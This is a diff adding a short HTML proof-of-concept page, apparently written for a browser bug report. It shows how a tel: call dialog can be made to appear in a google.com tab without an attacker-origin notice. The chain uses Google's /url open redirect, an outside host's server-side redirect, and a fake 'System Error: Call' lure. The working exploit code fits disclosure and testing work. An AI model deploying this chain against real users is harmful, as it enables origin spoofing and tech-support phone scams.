@@ -1,0 +1,30 @@
+<!doctype html>
+<html>
+<head>
+<style>html { font-family: sans-serif; }</style>
+</head>
+<body>
+<h1>Client-side redirect by target + Server-side redirect by attacker (tel)</h1>
+
+<p>This page shows a tel: (call) dialog in the target origin's tab, without a "from attacker.tld" notice.</p>
+<p>How?</p>
+<ol>
+    <li>This page opens new window to target origin (https://www.google.com)</li>
+    <li>...and then navigates this page in background to target-origin page (https://www.google.com/url?q=https://attacker.tld/...)</li>
+    <li>The target-origin page performs page-initiated redirect to malicious URL (https://attacker.tld/...)
+    <li>Finally, the malicious URL performs a server-side redirect to tel: URL, which shows the dialog in the currently-active tab.</li>
+</ol>
+
+<button id="btn">Continue to Google.com</button>
+<script>
+var show = () => {
+    window.location = 'https://www.google.com/url?q=https%3A%2F%2Faogarantiza.com%2Fchromium%2Fexternal-protocol%2Ftel.php&sa=D&sntz=1&usg=AFQjCNEUEKsWLeTxzL6gKZT1TR_zarnCJg';
+}
+    
+btn.addEventListener('click', (e) => {
+    window.open('https://www.google.com/?q=System%20Error:%20Call%201-555-555-5555', 'google');
+    setTimeout(show, 100); // Wait for tab to open
+});
+</script>
+</body>
+</html>
